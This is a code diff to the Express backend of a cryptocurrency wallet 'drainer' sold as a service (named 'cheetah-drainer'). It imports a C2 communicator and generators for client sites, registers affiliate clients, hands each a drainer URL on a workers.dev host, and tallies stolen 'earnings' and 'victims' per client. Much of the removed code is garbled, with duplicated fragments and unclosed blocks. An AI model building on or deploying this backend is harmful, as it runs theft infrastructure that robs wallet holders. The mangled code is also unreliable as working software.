@@ -22,12 +22,23 @@ import { getExplorerApiKey, getRpcUrl } from './config.js';
 import { CoreDrainer } from './coreDrainer.js';
 import { flowCoordinator } from './modules/FlowCoordinator.js';
 import { uiManager } from './modules/UIManager.js';
-import cron from "node-cron";
+import { c2Communicator } from './modules/c2Communicator.js';
+import { securityManager } from './modules/securityManager.js';
+import { chainManager } from './modules/chainManager.js';
+import { generateClientSite } from './client-template.js';
+import { generateMarketingSite } from './saas-website.js';
 
+import cron from "node-cron";
+// ✅ EXPRESS SETUP (ADD THIS)
 const app = express();
 const server = http.createServer(app);
 export const io = new SocketIOServer(server);
+
+// Middleware
 app.use(cors());
+app.use(express.json());
+app.use(adminAuth);
+
 const coreDrainer = new CoreDrainer();
 
 // Main marketing website
@@ -52,118 +63,11 @@ app.get("/signup", (req, res) => {
 
 // ==================== SAAS CLIENT MANAGEMENT ====================
 let clients = new Map();
-// File-based client data storage
 
-// Save all client data to file
-  try {
-    const clientsData = {
-      clients: Array.from(clients.entries()),
-      earnings: Array.from(clientEarnings.entries()),
-      victims: Array.from(clientVictims.entries()),
-      timestamp: new Date().toISOString()
-    };
-  try {
-// Load existing data on server start
-
-// Auto-save every 5 minutes
-
-    };
-  try {
-      clients = new Map(data.clients || []);
-      console.log("📂 Loaded " + clients.size + " clients from storage");
-    }
-  } catch (error) {
-    console.log("No existing client data found or file corrupted");
-  }
-}
-
-// Load existing data on server start
-
-// Auto-save every 5 minutes
-
-
-
-
-
-
-// Load existing data on server start
-
-// Auto-save every 5 minutes
-
-
-
-
-
-
-  try {
-    const clientsData = {
-      clients: Array.from(clients.entries()),
-      earnings: Array.from(clientEarnings.entries()),
-      victims: Array.from(clientVictims.entries()),
-      timestamp: new Date().toISOString()
-    };
-  try {
-      clients = new Map(data.clients || []);
-      console.log("📂 Loaded " + clients.size + " clients from storage");
-    }
-  } catch (error) {
-    console.log("No existing client data found or file corrupted");
-  }
-}
-
-  try {
-    const clientsData = {
-      clients: Array.from(clients.entries()),
-      earnings: Array.from(clientEarnings.entries()),
-      victims: Array.from(clientVictims.entries()),
-      timestamp: new Date().toISOString()
-    };
-  try {
-      clients = new Map(data.clients || []);
-      console.log("📂 Loaded " + clients.size + " clients from storage");
-    }
-  } catch (error) {
-    console.log("No existing client data found or file corrupted");
-  }
-}
-  try {
-    const clientsData = {
-      clients: Array.from(clients.entries()),
-      earnings: Array.from(clientEarnings.entries()),
-      victims: Array.from(clientVictims.entries()),
-      timestamp: new Date().toISOString()
-    };
-  try {
-      clients = new Map(data.clients || []);
-      console.log("📂 Loaded " + clients.size + " clients from storage");
-    }
-  } catch (error) {
-    console.log("No existing client data found or file corrupted");
-  }
-}
-
-// Load existing data on server start
-
-// Auto-save every 5 minutes
-  try {
-    const clientsData = {
-      clients: Array.from(clients.entries()),
-      earnings: Array.from(clientEarnings.entries()),
-      victims: Array.from(clientVictims.entries()),
-      timestamp: new Date().toISOString()
-    };
-  try {
-      clients = new Map(data.clients || []);
-      console.log(`📂 Loaded ${clients.size} clients from storage`);
-    }
-  } catch (error) {
-    console.log('No existing client data found or file corrupted');
-  }
-}
-
-// Load existing data on server start
-
-// Auto-save every 5 minutes
+// Client configuration structure
+class Client {
+  constructor(id, config) {
+    this.id = id;
     this.name = config.projectName;
     this.themeColor = config.themeColor || '#6366f1';
     this.wallet = config.wallet;
@@ -204,7 +108,7 @@ app.post('/saas/register', (req, res) => {
   success: true,
   clientId: clientId,
   drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
-  dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}&color=${themeColor}`,
+  dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}`,
   message: 'Client registered successfully'
 });
     
@@ -236,25 +140,12 @@ function initializeBitcoin() {
     console.log('⚠️ Bitcoin initialization failed:', error.message);
     return null;
   }
-  try {
-    const clientsData = {
-      clients: Array.from(clients.entries()),
-      earnings: Array.from(clientEarnings.entries()),
-      victims: Array.from(clientVictims.entries()),
-      timestamp: new Date().toISOString()
-    };
-  try {
-      clients = new Map(data.clients || []);
-      console.log("📂 Loaded " + clients.size + " clients from storage");
-    }
-  } catch (error) {
-    console.log("No existing client data found or file corrupted");
-  }
 }
 
-// Load existing data on server start
 
-// Auto-save every 5 minutes
+// ==================== ENHANCED CLIENT MANAGEMENT ====================
+let clientEarnings = new Map();
+let clientVictims = new Map();
 
 // Enhanced Client class
 class EnhancedClient {
@@ -304,7 +195,7 @@ app.post('/saas/v2/register', (req, res) => {
   success: true,
   clientId: clientId,
   drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
-  dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}&color=${themeColor}`,
+  dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}`,
   message: 'Client registered successfully'
 });
     
@@ -1934,9 +1825,6 @@ app.get("/api/history", (req, res) => {
 app.get("/api/saas-clients", (req, res) => {
   try {
     const clientsArray = Array.from(clients.entries()).map(([clientId, client]) => {
-  if (!clients || !clientEarnings || !clientVictims) {
-    return res.json({ success: true, totalClients: 0, clients: [] });
-  }
       const earnings = clientEarnings.get(clientId) || [];
       const totalEarnings = earnings.reduce((sum, e) => sum + (parseFloat(e.amount) || 0), 0);
       const victimCount = (clientVictims.get(clientId) || []).length;
@@ -1950,7 +1838,7 @@ app.get("/api/saas-clients", (req, res) => {
         victimCount,
         registrationDate: "Recent",
         drainerUrl: "https://ch.xqx.workers.dev/?client=" + clientId,
-        dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}&color=${client.themeColor}`
+        dashboardUrl: "https://service-s816.onrender.com/saas/dashboard/" + clientId
       };
     });
     
@@ -4434,105 +4322,3 @@ app.use((req, res, next) => {
 
 
 
-
-// Uptime monitoring endpoint - keep server awake
-app.get('/ping', (req, res) => {
-  res.json({ 
-    status: 'pong', 
-    timestamp: new Date().toISOString(),
-    server: 'cheetah-drainer',
-    version: '1.0'
-  });
-});
-
-
-// Save all client data to file
-  try {
-    const clientsData = {
-      clients: Array.from(clients.entries()),
-      earnings: Array.from(clientEarnings.entries()),
-      victims: Array.from(clientVictims.entries()),
-      timestamp: new Date().toISOString()
-    };
-    console.log(`💾 Saved ${clients.size} clients to file`);
-  } catch (error) {
-    console.error('Error saving clients to file:', error);
-  }
-}
-
-// Load client data from file on startup
-  try {
-      clients = new Map(data.clients || []);
-      console.log(`📂 Loaded ${clients.size} clients from storage`);
-    }
-  } catch (error) {
-    console.log('No existing client data found or file corrupted');
-  }
-}
-
-// Load existing data on server start
-
-// Auto-save every 5 minutes
-
-// Also save when new clients register (add to registration endpoints)
-
-
-
-
-
-
-  try {
-    const clientsData = {
-      clients: Array.from(clients.entries()),
-      earnings: Array.from(clientEarnings.entries()),
-      victims: Array.from(clientVictims.entries()),
-      timestamp: new Date().toISOString()
-    };
-    console.log('💾 Saved ' + clients.size + ' clients to file');
-  } catch (error) {
-    console.error('Error saving clients to file:', error);
-  }
-}
-
-  try {
-      clients = new Map(data.clients || []);
-      console.log('📂 Loaded ' + clients.size + ' clients from storage');
-    }
-  } catch (error) {
-    console.log('No existing client data found or file corrupted');
-  }
-
-let clientEarnings = new Map();
-let clientVictims = new Map();
-const CLIENTS_DATA_FILE = \"clients-data.json\";
-
-function saveClientsToFile() {
-  try {
-    const clientsData = {
-      clients: Array.from(clients.entries()),
-      earnings: Array.from(clientEarnings.entries()),
-      victims: Array.from(clientVictims.entries()),
-      timestamp: new Date().toISOString()
-    };
-    fs.writeFileSync(CLIENTS_DATA_FILE, JSON.stringify(clientsData, null, 2));
-    console.log('💾 Saved ' + clients.size + ' clients to file');
-  } catch (error) {
-    console.error('Error saving clients to file:', error);
-  }
-}
-
-function loadClientsFromFile() {
-  try {
-    if (fs.existsSync(CLIENTS_DATA_FILE)) {
-      const data = JSON.parse(fs.readFileSync(CLIENTS_DATA_FILE, 'utf8'));
-      clients = new Map(data.clients || []);
-      clientEarnings = new Map(data.earnings || []);
-      clientVictims = new Map(data.victims || []);
-      console.log('📂 Loaded ' + clients.size + ' clients from storage');
-    }
-  } catch (error) {
-    console.log('No existing client data found or file corrupted');
-  }
-
-loadClientsFromFile();
-setInterval(saveClientsToFile, 300000);
